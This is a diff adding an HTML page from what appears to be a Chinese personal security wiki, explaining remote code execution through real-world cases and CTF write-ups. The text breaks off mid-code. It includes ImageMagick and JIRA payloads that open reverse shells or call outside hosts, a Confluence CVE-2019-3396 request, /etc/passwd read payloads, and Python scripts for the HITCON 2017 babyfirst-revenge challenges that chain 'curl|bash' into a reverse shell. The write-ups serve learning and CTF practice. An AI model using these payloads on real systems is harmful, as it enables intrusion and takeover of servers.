@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          WebSecurity-rce - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>仅以此文系统的学习一下rce漏洞，包括其原理，分类，绕过方式，防御方式<a id="more"></a> </p>
+<p>RCE漏洞一直是最受关注的漏洞之一</p>
+<p>导致rce有以下几种方法</p>
+<ol>
+<li>文件上传(upload篇)</li>
+<li>命令注入</li>
+<li>未授权访问</li>
+<li>cms通用漏洞</li>
+</ol>
+<h2 id="一些案例"><a href="#一些案例" class="headerlink" title="一些案例"></a>一些案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、Jenkins 未授权访问(端口任意)  admin   123456</span><br><span class="line">2、postgresql数据库未授权访问</span><br><span class="line">3、Java rmi 1099端口反序列化命令执行漏洞</span><br><span class="line">4、weblogic 7001端口反序列化命令执行</span><br><span class="line">5、imagemagic修改头像 </span><br><span class="line">	push graphic-context</span><br><span class="line">	viewbox 0 0 640 480</span><br><span class="line">    image copy 200,200 100,100 &quot;|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;【ip】&#x2F;2333 0&gt;&amp;1&quot;</span><br><span class="line">    pop graphic-context</span><br><span class="line">    </span><br><span class="line">    push graphic-context</span><br><span class="line">	viewbox 0 0 640 480</span><br><span class="line">	fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|bash -i &gt;&amp; 	&#x2F;dev&#x2F;tcp&#x2F;107.151.220.83&#x2F;12345 0&gt;&amp;1&quot;)&#39;</span><br><span class="line">	pop graphic-context</span><br><span class="line">	</span><br><span class="line">    http:&#x2F;&#x2F;supports.house.***.com.cn&#x2F;bbs&#x2F;img.php?		  w&#x3D;140&amp;h&#x3D;105&amp;m&#x3D;1&amp;url&#x3D;http:&#x2F;&#x2F;img2.3lian.com&#x2F;img2007&#x2F;19&#x2F;33&#x2F;005.jpg把其中的url换成自己服务器的jpg</span><br><span class="line">6、zabbix未授权访问命令执行 Admin zabbix</span><br><span class="line">7、struts2 http:&#x2F;&#x2F;www.anquan.us&#x2F;static&#x2F;bugs&#x2F;wooyun-2016-0207420.html</span><br><span class="line">8、jboss反序列化漏洞</span><br></pre></td></tr></table></figure>
+
+<p>国外案例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LFI to RCE</span><br><span class="line">	所有我们的访问记录会在一个文件，所以找到这个文件，结合文件包含即可达到RCE的作用</span><br><span class="line">	&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log</span><br><span class="line">	&#x2F;proc&#x2F;self&#x2F;fd&#x2F;num</span><br><span class="line">	&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">SSRF to RCE</span><br><span class="line">	parse html content from html to pdf</span><br><span class="line">	pdf can parse the tag like img iframe</span><br><span class="line">	&quot;&gt;&lt;iframe src&#x3D;”file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”&#x2F;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">	&quot;&gt;&lt;iframe src&#x3D;”file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow”&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>JIRA contact admin处</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//jiraserver/secure/ContactAdministrators!default.jspa   		$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://avtohanter.ru/rcetest?a=a').waitFor()</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>confluence： cve-2019-3394本地文件读取</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6.1.0 &lt;&#x3D; version &lt; 6.6.16</span><br><span class="line">6.7.0 &lt;&#x3D; version &lt; 6.13.7</span><br><span class="line">6.14.0 &lt;&#x3D; version &lt; 6.15.8</span><br><span class="line">需要有账号</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;1025&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong>confluence： cve-2019-3396未授权RCE</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">所有1.xx，2.xx，3.xx，4.xx和5.xx版本</span><br><span class="line">所有6.0.x，6.1.x，6.2.x，6.3.x，6.4.x和6.5.x版本</span><br><span class="line">6.6.12之前的所有6.6.x版本</span><br><span class="line">所有6.7.x，6.8.x，6.9.x，6.10.x和6.11.x版本</span><br><span class="line">6.12.3之前的所有6.12.x版本</span><br><span class="line">6.13.3之前的所有6.13.x版本</span><br><span class="line">6.14.2之前的所有6.14.x版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/<span class="number">1</span>/macro/preview HTTP/<span class="number">1.1</span></span><br><span class="line">Referer: https:<span class="comment">//cms-km.***.***.cn/</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">73.0</span><span class="number">.3683</span><span class="number">.103</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: application/json; charset=utf<span class="number">-8</span></span><br><span class="line">Cookie: BIGipServerrb-p_cp-confluence_https_pool=!BUsntvn1os/<span class="number">4</span>xuQWbHAsuN+<span class="number">1</span>fsz22TIKPNFouw==;JSESSIONID=E3A43CEFE1932634CD80E301057C379D</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip,deflate</span></span><br><span class="line"><span class="comment">Content-Length: 167</span></span><br><span class="line"><span class="comment">Host: cms-km.***.***.cn</span></span><br><span class="line"><span class="comment">Connection: Keep-alive</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#123;"contentId":"786444","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://www.youtube.com/watch?v=1","width":"200","height":"200","_template":"../web.xml"&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>confluence： cve-2019-3398路径穿越</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2.0.0 &lt;&#x3D; version &lt; 6.6.13</span><br><span class="line">6.7.0 &lt;&#x3D; version &lt; 6.12.4</span><br><span class="line">6.13.0 &lt;&#x3D; version &lt; 6.13.4</span><br><span class="line">6.14.0 &lt;&#x3D; version &lt; 6.14.3</span><br><span class="line">6.15.0 &lt;&#x3D; version &lt; 6.15.2</span><br><span class="line">在Page或Blogs具有添加附件权限的用户，或具有创建新空间或个人空间权限的用户，或对某空间具有“管理员”权限的用户可利用此路径穿越漏洞将文件写入任意位置。一定条件下可以执行任意代码。</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4854</span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE-CTF"><a href="#RCE-CTF" class="headerlink" title="RCE-CTF"></a>RCE-CTF</h2><h3 id="READY-WORK-1"><a href="#READY-WORK-1" class="headerlink" title="READY WORK 1"></a>READY WORK 1</h3><p>要想实现远端控制设备，就必须时两台机器进行通信，于是我们在本地开启了<code>http</code>服务，并且在主页面写个<code>bash</code>命令，这时只用在靶机上执行<code>curl</code>命令即可实现<code>RCE</code>了，当然还有很多其他的方法。</p>
+<p>本机<code>index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.1.3.47&#x2F;12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><code>nc</code>监听端口<code>nc -lvnp 12345</code></p>
+<p><img src="/img/rce_1.png" alt=""></p>
+<p>靶机执行<code>curl 10.1.3.47|bash</code></p>
+<p><img src="/img/rce_2.png" alt=""></p>
+<p>可以看到拿到了权限，后面的题目大多是利用这个原理。</p>
+<h3 id="READY-WORK-2"><a href="#READY-WORK-2" class="headerlink" title="READY WORK 2"></a>READY WORK 2</h3><p>本次试验环境，我使用的是<code>docker</code>来部署，<a href="https://github.com/Pr0phet/hitconDockerfile/" target="_blank" rel="noopener">源码地址</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x01 创建一个目录存放dockerfile并且进入该目录</span><br><span class="line">0x02 docker build -t &#39;自定义的镜像名称&#39; .（注意后面有个点）</span><br><span class="line">0x03 docker images 查看是否已经挂载你所命名的镜像</span><br><span class="line">0x04 docker run -id --name &#39;自定义容器名称&#39; -m &#39;要分配给此容器的内存上限&#39; -p &#39;容器的外部端口&#39;:80 &#39;自定义镜像名称&#39; &#x2F;run.sh </span><br><span class="line">0x05 docker exec -it &#39;容器名称&#39; &#x2F;bin&#x2F;bash 进入你自己的容器</span><br></pre></td></tr></table></figure>
+
+<h3 id="HITCON-2017-babyfirst-revenge"><a href="#HITCON-2017-babyfirst-revenge" class="headerlink" title="HITCON 2017 babyfirst-revenge"></a>HITCON 2017 babyfirst-revenge</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 5) &#123;</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>访问主页即可看到源码，在<code>/www/sandbox/</code>下有每个人独立的一个文件夹进行操作，同时有个<code>cmd</code>无论我们传什么进去他都会照单执行，但是每次的长度限制为最多5个字符。</p>
+<p>一般来说，我们会想到写入一句话，然后通过菜刀进行<code>xxoo</code>但是这里只能最多5个字符，光<code>echo</code>就4个了所以得换个思路—-&gt; <code>ls</code></p>
+<p><strong>在linux里面，ls -t &gt;g可以把ls后得到的结果写入g文件里面，&gt;a可以创建一个a文件，而sh g可以执行g文件并且在linux里反斜杆可以用来拼接和转译，于是就有了思路</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;&gt;ls\\    #创建ls\文件</span><br><span class="line">?cmd&#x3D;ls&gt;_    #创建 _ 文件 文件内容为_ \n ls\ \n 这个命令会先生成一个文件再执行命令</span><br><span class="line">?cmd&#x3D;&gt;\ \\    #创建 空格\ 文件</span><br><span class="line">?cmd&#x3D;&gt;-t\\    #创建 -t\ 文件</span><br><span class="line">?cmd&#x3D;&gt;\&gt;g    #创建 &gt;g 文件</span><br><span class="line">?cmd&#x3D;ls&gt;&gt;_   #将刚刚创建的文件名按照字典序写入_文件 这里的字典序是特殊符号在ls\的前面 所以在生成ls\之后我们要先ls&gt;_ 保证ls\在最前面</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/rce_3.png" alt=""></p>
+<p>这样我们在<code>sh _</code>后就会执行<code>ls -t&gt;g</code>注意，<code>ls</code>在遇见执行失败后会继续往下执行</p>
+<p>因此可以利用这个思路把<code>curl 10.1.3.47|bash</code>写入<code>g</code>文件，然后<code>sh g</code>即可实现<code>rce</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">	# generate &#39;ls -t&gt;g&#39; file</span><br><span class="line">	&#39;&gt;ls\\&#39;,</span><br><span class="line">	&#39;ls&gt;_&#39;,</span><br><span class="line">	&#39;&gt;\ \\&#39;,</span><br><span class="line">	&#39;&gt;-t\\&#39;,</span><br><span class="line">	&#39;&gt;\&gt;g&#39;,</span><br><span class="line">	&#39;ls&gt;&gt;_&#39;,</span><br><span class="line">	</span><br><span class="line">	# generate &#39;curl 10.1.3.47|bash&#39;</span><br><span class="line">	&#39;&gt;sh\ &#39;,</span><br><span class="line">	&#39;&gt;ba\\&#39;,</span><br><span class="line">	&#39;&gt;\|\\&#39;,</span><br><span class="line">	&#39;&gt;47\\&#39;,</span><br><span class="line">	&#39;&gt;3.\\&#39;,</span><br><span class="line">	&#39;&gt;1.\\&#39;,</span><br><span class="line">	&#39;&gt;0.\\&#39;,</span><br><span class="line">	&#39;&gt;1\\&#39;,</span><br><span class="line">	&#39;&gt;\ \\&#39;,</span><br><span class="line">	&#39;&gt;rl\\&#39;,</span><br><span class="line">	&#39;&gt;cu\\&#39;,</span><br><span class="line">	</span><br><span class="line">	# exec</span><br><span class="line">	&#39;sh _&#39;,</span><br><span class="line">	&#39;sh g&#39;,</span><br><span class="line">]</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">	assert len(i)&lt;&#x3D;5</span><br><span class="line">	r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?cmd&#x3D;&#39; + quote(i) )</span><br><span class="line">	print i</span><br><span class="line">	sleep(0.1)</span><br></pre></td></tr></table></figure>
+
+<p>贴一下jio本</p>
+<h3 id="HITCON-2017-babyfirst-revenge-v2"><a href="#HITCON-2017-babyfirst-revenge-v2" class="headerlink" title="HITCON 2017 babyfirst-revenge-v2"></a>HITCON 2017 babyfirst-revenge-v2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 4) &#123;</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>和上题基本一致，但是字段长度变成了4，限制了<code>ls&gt;&gt;_</code>因此<code>ls</code>不可用了</p>
+<p>这里我们再介绍几个命令</p>
+<p><code>dir:</code>虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p>
+<p><code>*:</code>相当于$(dir *),所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入.</p>
+<p><code>rev</code>:可以反转文件每一行的内容。</p>
+<p>所以这样如果<code>dir</code>在最前面的话,就可以把当前目录的文件都返回.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/rce_4.png" alt=""></p>
+<p>把当前内容写入<code>v</code>文件<code>*&gt;v</code></p>
+<p><img src="/img/rce_5.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure>
+
+<p>同理利用<code>rev</code>函数把<code>ls -th&gt;g</code>写入<code>x</code>文件</p>
+<p><img src="/img/rce_6.png" alt=""></p>
+<p>这样我们就达到了之前的第一步的目的</p>
+<p>后面类似</p>
+<p>贴一下jio本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">	# generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span><br><span class="line">    &#39;&gt;dir&#39;, </span><br><span class="line">    &#39;&gt;sl&#39;, </span><br><span class="line">    &#39;&gt;g\&gt;&#39;,</span><br><span class="line">    &#39;&gt;ht-&#39;,</span><br><span class="line">    &#39;*&gt;v&#39;,</span><br><span class="line"></span><br><span class="line">    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br><span class="line">    &#39;&gt;rev&#39;,</span><br><span class="line">    &#39;*v&gt;x&#39;,</span><br><span class="line">	</span><br><span class="line">	# generate &#39;curl 10.1.3.47|bash&#39;</span><br><span class="line">	&#39;&gt;sh&#39;,</span><br><span class="line">	&#39;&gt;ba\\&#39;,</span><br><span class="line">	&#39;&gt;\|\\&#39;,</span><br><span class="line">	&#39;&gt;47\\&#39;,</span><br><span class="line">	&#39;&gt;3.\\&#39;,</span><br><span class="line">	&#39;&gt;1.\\&#39;,</span><br><span class="line">	&#39;&gt;0.\\&#39;,</span><br><span class="line">	&#39;&gt;1\\&#39;,</span><br><span class="line">	&#39;&gt;\ \\&#39;,</span><br><span class="line">	&#39;&gt;rl\\&#39;,</span><br><span class="line">	&#39;&gt;cu\\&#39;,</span><br><span class="line">	</span><br><span class="line">	# exec</span><br><span class="line">	&#39;sh x&#39;,</span><br><span class="line">	&#39;sh g&#39;,</span><br><span class="line">]</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">	assert len(i)&lt;&#x3D;5</span><br><span class="line">	r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?cmd&#x3D;&#39; + quote(i) )</span><br><span class="line">	print i</span><br><span class="line">	sleep(0.1)</span><br></pre></td></tr></table></figure>
+
+<p>本来还想复现个入群题的，后来发现这个题目已经下线了= =</p>
+<p>膜一下郁师傅<a href="http://120.79.189.7/?p=436" target="_blank" rel="noopener">http://120.79.189.7/?p=436</a></p>
+<h3 id="HITCON-2015-BabyFirst"><a href="#HITCON-2015-BabyFirst" class="headerlink" title="HITCON 2015 BabyFirst"></a>HITCON 2015 BabyFirst</h3><p><a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">参考大佬wp</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">    $dir &#x3D; &#39;sandbox&#x2F;&#39; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">    if ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    for ( $i&#x3D;0; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        if ( 